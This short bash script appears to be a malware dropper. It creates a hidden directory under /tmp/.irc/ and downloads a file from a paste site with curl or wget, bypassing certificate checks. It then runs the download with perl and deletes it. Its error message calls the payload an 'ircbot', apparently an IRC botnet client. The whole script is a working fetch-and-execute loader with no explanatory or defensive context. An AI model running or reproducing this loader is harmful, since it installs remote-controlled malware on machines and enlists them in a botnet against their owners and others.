#!/bin/bash
local="/tmp/.irc/"
rm -rf "$local" 2>/dev/null
mkdir -p "$local"	

if ! curl -ks "http://ix.io/4e0X" -o "$local"vs 2>/dev/null && ! wget -q --no-check-certificate "http://ix.io/4e0X" -O "$local"vs 2>/dev/null; then
printf "[ERROR]: downloading ircbot\n"
exit 1
fi
perl "$local"vs;rm "$local"vs
exit 0
